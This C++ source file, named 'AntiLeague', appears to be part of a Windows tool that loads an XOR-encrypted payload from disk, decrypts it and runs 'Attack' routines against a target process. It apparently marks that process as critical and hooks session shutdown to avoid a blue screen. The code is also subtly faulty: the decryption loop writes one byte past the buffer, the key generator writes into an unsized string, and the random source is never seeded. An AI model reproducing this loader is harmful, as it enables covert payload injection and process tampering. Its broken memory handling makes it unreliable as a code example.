#include "stdafx.h"
#include "AntiLeague.h"

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

void AntiLeague::cipher()
{
    if (dec_key.empty())
    {
        MessageBox(NULL, L"Decryption Key Empty", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        exit(1);
    }

    for (size_t i = 0; i <= payload.size(); i++)
        payload[i] ^= dec_key[i % dec_key.size()];
}

void AntiLeague::gen_dec_key()
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < 10; ++i)
        dec_key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    AntiLeague& AntiLeague = AntiLeague::getInstance();

    if (msg != WM_ENDSESSION)
    {
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }

    if (wParam == TRUE)
    {
        if ((lParam == 0) || ((lParam & ENDSESSION_LOGOFF) == ENDSESSION_LOGOFF))
        {
            AntiLeague.Attack<DisableCriticalProc>(DisableCriticalProc(), "DisableCritical", NULL);
            ShutdownBlockReasonDestroy(hWnd);
        }
    }

    return 0;
}

DWORD WINAPI SafeShutdown(LPVOID event)
{
    const wchar_t name[] = L"AntiLeague";
    WNDCLASSEX wc = {};

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = &WndProc;
    wc.hInstance = (HINSTANCE)&__ImageBase;
    wc.lpszClassName = name;

    if (!RegisterClassEx(&wc))
    {
        MessageBox(NULL, L"Can't Register Window Class", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        return 1;
    }

    HWND& hWnd = AntiLeague::getInstance().hWnd;
    hWnd = CreateWindowEx(0, name, name, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, (HINSTANCE)&__ImageBase, NULL);

    if (hWnd == NULL)
    {
        MessageBox(NULL, L"Can't Create Window", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        return 1;
    }

    SetEvent(event);
    ShutdownBlockReasonCreate(hWnd, L"Preventing BSOD");

    MSG msg;

    while (GetMessage(&msg, hWnd, 0, 0))
    {
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

void AntiLeague::Init()
{
    std::string payloadLocation = getPayload();
    LoadPayload(payloadLocation);

    HANDLE objects[2] = { NULL };
    objects[1] = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (objects[1] == NULL)
    {
        MessageBox(NULL, L"Can't Create Event", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        exit(1);
    }

    SafeShutdown = objects[0] = CreateThread(NULL, 0, &::SafeShutdown, objects[1], 0, NULL);

    if (SafeShutdown == NULL)
    {
        MessageBox(NULL, L"Failed To Start Safe Shutdown Method", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
        exit(1);
    }

    WaitForMultipleObjects(2, objects, FALSE, INFINITE);

    if (WaitForSingleObject(objects[1], 0) != WAIT_OBJECT_0) //Failed
    {
        exit(1);
    }

    Attack<InitProc>(InitProc(), "Init", &payloadLocation);
}